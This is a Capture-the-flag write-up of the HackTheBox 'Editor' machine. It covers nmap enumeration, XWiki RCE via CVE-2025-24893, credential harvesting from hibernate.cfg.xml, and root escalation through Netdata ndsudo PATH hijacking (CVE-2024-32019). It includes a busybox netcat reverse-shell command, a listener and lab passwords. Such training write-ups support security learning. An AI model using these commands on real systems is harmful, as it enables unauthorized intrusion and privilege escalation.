
---

# Write-up : 

- **Platform:**  Hackthebox
- **Categorie:** Comprehensive Penetration
- **Machine OS :** Linux
- **Machine Name:** Editor
- **Machine Link:** [[Machine](https://app.hackthebox.com/machines/Editor)]
- **Machine Difficulty:** Easy (for me is meduim)
- **Skills:** Enumeration, Reverse Shell, Privilege Escalation, PATH Hijacking, python, c
- **Author:** achnouri

<br>

## Objective

Gain user and root privileges on the target machine

---

## Setup — VPN & hosts

I connected to the HTB VPN, confirmed my network interfaces and check the connection to machine :

```bash
└──╼ $ sudo openvpn lab_achnr.ovpn
```
```bash
└──╼ $ ip addr
```
```bash
└──╼ $ ping -c 4 10.10.11.80
```

## - Enumeration and Reconnaissance

**- Scanning with nmap**

```bash
└──╼ $ sudo nmap -sC -sV -p- -vv -oA scan1 10.10.11.80
```
```bash
Nmap scan report for editor.htb (10.10.11.80)
Host is up, received echo-reply ttl 63 (0.55s latency).
Scanned at 2025-05-31 00:58:58 +01 for 22s
Not shown: 997 closed tcp ports (reset)


PORT     STATE SERVICE REASON         VERSION

22/tcp   open  ssh     syn-ack ttl 63 OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBJ+m7rYl1vRtnm789pH3IRhxI4CNCANVj+N5kovboNzcw9vHsBwvPX3KYA3cxGbKiA0VqbKRpOHnpsMuHEXEVJc=
|   256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOtuEdoYxTohG80Bo6YCqSzUY9+qbnAFnhsk4yAZNqhM

80/tcp   open  http    syn-ack ttl 63 nginx 1.18.0 (Ubuntu)
|_http-server-header: nginx/1.18.0 (Ubuntu)
| http-methods: 
|_  Supported Methods: GET HEAD
|_http-title: Editor - SimplistCode Pro

8080/tcp open  http    syn-ack ttl 63 Jetty 10.0.20
| http-methods: 
|   Supported Methods: OPTIONS GET HEAD PROPFIND LOCK UNLOCK
|_  Potentially risky methods: PROPFIND LOCK UNLOCK
|_http-open-proxy: Proxy might be redirecting requests
| http-cookie-flags: 
|   /: 
|     JSESSIONID: 
|_      httponly flag not set
| http-title: XWiki - Main - Intro
|_Requested resource was http://editor.htb:8080/xwiki/bin/view/Main/
| http-webdav-scan: 
|   WebDAV type: Unknown
|   Server Type: Jetty(10.0.20)
|_  Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
| http-robots.txt: 50 disallowed entries (40 shown)
| /xwiki/bin/viewattachrev/ /xwiki/bin/viewrev/ 
| /xwiki/bin/pdf/ /xwiki/bin/edit/ /xwiki/bin/create/ 
| /xwiki/bin/inline/ /xwiki/bin/preview/ /xwiki/bin/save/ 
| /xwiki/bin/saveandcontinue/ /xwiki/bin/rollback/ /xwiki/bin/deleteversions/ 
| /xwiki/bin/cancel/ /xwiki/bin/delete/ /xwiki/bin/deletespace/ 
| /xwiki/bin/undelete/ /xwiki/bin/reset/ /xwiki/bin/register/ 
| /xwiki/bin/propupdate/ /xwiki/bin/propadd/ /xwiki/bin/propdisable/ 
| /xwiki/bin/propenable/ /xwiki/bin/propdelete/ /xwiki/bin/objectadd/ 
| /xwiki/bin/commentadd/ /xwiki/bin/commentsave/ /xwiki/bin/objectsync/ 
| /xwiki/bin/objectremove/ /xwiki/bin/attach/ /xwiki/bin/upload/ 
| /xwiki/bin/temp/ /xwiki/bin/downloadrev/ /xwiki/bin/dot/ 
| /xwiki/bin/delattachment/ /xwiki/bin/skin/ /xwiki/bin/jsx/ /xwiki/bin/ssx/ 
| /xwiki/bin/login/ /xwiki/bin/loginsubmit/ /xwiki/bin/loginerror/ 
|_/xwiki/bin/logout/
|_http-server-header: Jetty(10.0.20)


Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done at Sat May 31 00:59:20 2025 -- 1 IP address (1 host up) scanned in 22.51 seconds
```
`-sC` : run the default NSE scripts, equivalent to --script=default

`-sV` : detect service versions

`-p-` : scan all TCP ports (1–65535)

`-vv` : more detailed output

`-oA` : save results in all formats (.nmap, .gnmap, .xml)

Key results:

* `22/tcp` — OpenSSH 8.9p1 (Ubuntu)
* `80/tcp` — nginx 1.18.0 (redirects to `editor.htb`)
* `8080/tcp` — Jetty 10.0.20 serving **XWiki** (WebDAV methods allowed: PROPFIND, LOCK, UNLOCK)
* `robots.txt` on XWiki included many admin endpoints which were useful for focused testing.

<br>

I added the target `http://editor.htb` to `/etc/hosts` so the virtual hostname resolved correctly in my browser:
```bash
└──╼ $ sudo vim /etc/hosts 
```
or by smart method :

```bash
└──╼ $ echo "10.10.11.80 editor.htb" | sudo tee -a /etc/hosts
```
---

## Initial web recon

**- Vulnerability Identification**

- When I visited `http://editor.htb:8080/xwiki/bin/view/Main/`, I checked the footer and found the XWiki version: **XWiki Debian 15.10.8**

- I found that this XWiki version was vulnerable to CVE-2025-24893

- This vulnerability allows remote code execution (RCE) with authenticated access
 
>CVE-2025-24893: Unauthenticated Remote Code Execution in XWiki

>(scroll down to `READ MORE` part and raed about CVE-2025-24893)

---

## Exploitation (Reversing Shell)

#### - Set up listener

```bash
└──╼ $ nc -lvnp 1337
```

`nc` : netcat program (network utility for reading/writing TCP/UDP connections).

`-l` : listen mode: act as a server and wait for incoming connections.

`-v` : verbose: print extra information about connections (who connected, IP/port, etc.).

`-n` : numeric: do not perform DNS lookups; use numeric IPs only (faster / avoids delays).

`-p` : port: specify the local port to bind to (required by some nc implementations).

`1337` : the TCP port number to listen on

#### - Execute reverse shell

```bash
└──╼ $ python3 CVE-2025-24893.py -t 'http://10.10.1180:8080' -c 'busybox nc 10.xx.16.17 1337 -e /bin/bash'
```

`python3` : run the program using python

`CVE-2025-24893.py` : the Python PoC script

`-t` : option flag refers to “URL” (the script expects the target base URL with this flag)

`http://10.10.11.80:8080` : the target address: http scheme, IP 10.10.11.80, port 8080 (where the vulnerable app listens)

`-c` : option flag meaning “command” (the script will attempt to run the following command on the target)

`busybox` : the Busybox binary on the target (a single executable that provides many small Unix tools)

`nc` : netcat (network utility provided by BusyBox in this case) — used to open TCP/UDP connections

`10.xx.16.17` : attacker machine IP (the address the target should connect back to)

`1337` : TCP port on the attacker machine that will receive the incoming connection

`-e` : netcat option that executes the specified program and attaches its stdio to the network socket

`/bin/bash` : the shell to execute on the target, provides an interactive shell to the listener

**The connection succeeded, and I obtained a shell as the xwiki user**

### - Finding user credentials

```bash
python3 -c 'import pty; pty.spawn("/bin/bash")'
```

I imported the pty module and ran pty.spawn(\"/bin/bash\") to make the shell interactive, so command entry and tab completion worked as expected

```bash
xwiki@editor:/home$ whoami      
xwiki
```

```bash
xwiki@editor:/home$ ls
oliver
```
```bash
xwiki@editor:/home$ cd oliver
cd oliver
bash: cd: oliver: Permission denied
```

Access to the user home `/home/oliver` was denied, so I examined Xwiki’s configuration files for possible passwords

```bash
xwiki@editor:/etc$ cat passwd
```
I searched for XWiki configuration files (hibernate.cfg.xml, xwiki.cfg, xwiki.properties) and found that `hibernate.cfg.xml` contained the database password
 
```bash
xwiki@editor:/$ find /* -type f -name "*.cfg.xml" 2>/dev/null

/etc/xwiki/hibernate.cfg.xml
/usr/share/xwiki/templates/mysql/hibernate.cfg.xml
/var/lib/ucf/cache/:etc:xwiki:hibernate.cfg.xml
```
`/etc/xwiki/hibernate.cfg.xmlù`

```bash
xwiki@editor:/$ cat /etc/xwiki/hibernate.cfg.xml | grep -i "pass"

<$ cat /etc/xwiki/hibernate.cfg.xml | grep -i "pass"
    <property name="hibernate.connection.password">theEd1t0rTeam99</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password">xwiki</property>
    <property name="hibernate.connection.password"></property>
```
PASSWORD FOUND : `theEd1t0rTeam99`

This password could be used to ssh log in as the `oliver user`

### Accessing User Flag:

Using the credentials from the XWiki configuration, I access into the machine as oliver:

```bash
└──╼ $ ssh oliver@editor.htb
```

After success logging in, I navigated to the home directory and checked the files:

```bash
oliver@editor:~$ ls
Buttons  linpeas.sh  nvme  user.txt
```
```bash
oliver@editor:~$ cat user.txt 
66630784f13ee52b0392001e8fd88337
```

`I FOUND THEn USER FLAG `

---

### Accessing Root Flag:

```bash
oliver@editor:/$ cd /root/
-bash: cd: /root/: Permission denied
```

I searched for SUID binaries:

```bash
oliver@editor:~$ find / -perm -4000 -type f 2> /dev/null

/opt/netdata/usr/libexec/netdata/plugins.d/cgroup-network
/opt/netdata/usr/libexec/netdata/plugins.d/network-viewer.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/local-listeners
/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo
/opt/netdata/usr/libexec/netdata/plugins.d/ioping
/opt/netdata/usr/libexec/netdata/plugins.d/nfacct.plugin
/opt/netdata/usr/libexec/netdata/plugins.d/ebpf.plugin
/usr/bin/newgrp
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/umount
/usr/bin/chsh
/usr/bin/fusermount3
/usr/bin/sudo
/usr/bin/passwd
/usr/bin/mount
/usr/bin/chfn
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/lib/openssh/ssh-keysign
/usr/libexec/polkit-agent-helper-1
```

<br>

`find` : the command to search for files and directories

`/` : the starting path for the search (root of the filesystem)

`-perm` : option to match file permissions

`-4000` : permission mask to match SUID files (the leading 4 = SUID bit)

`-type` : option to match entry type

`f` : argument to -type, means “regular file”

`2>` : shell redirection for stderr (file descriptor 2)

<br>

I noticed binaries `/opt/netdata/usr/libexec/netdata/plugins.d/*`

These `Netdata` plugin binaries caught my attention because they were `SUID` and potentially vulnerable, netdata is often run as `root` or with elevated privileges, and improperly secured or outdated plugins can sometimes allow privilege escalation.

The scan revealed a netdata plugin at `/opt/netdata/usr/libexec/netdata/plugins.d/ndsudo`, which was vulnerable to `CVE‑2024‑32019` and allowed arbitrary code execution as root

I wrote a C program to exploit CVE‑2024‑32019 and gain root privileges

```bash
gcc -Wall -Werror -Wextra CVE-2024-32019.c -o nvme && chmod +x nvme
```

```bash
└──╼ $ scp nvme oliver@editor.htb:/tmp

oliver@editor.htb's password:
nvme                                                                             100%   16KB  25.3KB/s   00:00    
```
I compiled the program and transfered binary program to the target machine 

```bash
oliver@editor:/tmp$ export PATH+=:/tmp
```
I added /tmp to my PATH, which meant any program I launched would look in /tmp for executables, but only after checking the directories already listed

```bash
oliver@editor:/tmp$ /opt/netdata/usr/libexec/netdata/plugins.d/ndsudo nvme-list
```
I ran the netdata helper ndsudo and passed it the nvme-list argument

```bash
root@editor:/root ls /root/
root.txt  scripts  snap
```

```bash
root@editor:/root cat root.txt 
dc1ead0e404ffa911fca9800fe095f25
```

`I FOUND THE ROOT FLAG `

---

<br>

## READ MORE (search by yourself) :

Vulnerability - CVE-2025-24893 (XWiki RCE)

SUID Binaries - CVE-2024-32019 (Netdata ndsudo / PATH hijack)

RCE - Remote Code Execution qnd Reverse Shell

Privilege Escalation - PATH Hijacking

Linux SUID Binaries and Exploitation Techniques

Netdata Security Vulnerabilities

<br>

## Disclaimer

This write-up is for educational purposes only. All techniques, tools, and methods demonstrated here were used in a legal training environment (CTF challenge)
The author assumes no liability for misuse
<br>

###### This write-up was created by [`@achnouri`](https://github.com/achnouri)

---
